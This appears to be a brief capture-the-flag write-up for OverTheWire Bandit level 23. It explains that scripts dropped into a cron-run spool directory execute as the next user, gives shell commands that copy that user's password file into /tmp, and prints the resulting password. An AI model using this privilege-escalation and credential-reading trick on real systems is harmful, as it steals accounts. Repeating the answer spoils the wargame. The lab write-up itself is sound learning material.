# level 23 

> ### 

<img width="947" height="477" alt="image" src="https://github.com/user-attachments/assets/eb5fe616-37cf-4934-83d7-1b2617a02e99" />

> ## so if i write any file in **`/var/spool/bandit24/foo`** it will excuted as bandit24 and removed 

```
cd /var/spool/bandit24/foo
nano script.sh

```

<img width="997" height="379" alt="image" src="https://github.com/user-attachments/assets/fba748fd-8459-4e14-811b-809967a8706d" />

```bash
echo '#!/bin/bash' > /var/spool/bandit24/foo/getpass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass' >> /var/spool/bandit24/foo/getpass.sh
chmod +x /var/spool/bandit24/foo/getpass.sh

```

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

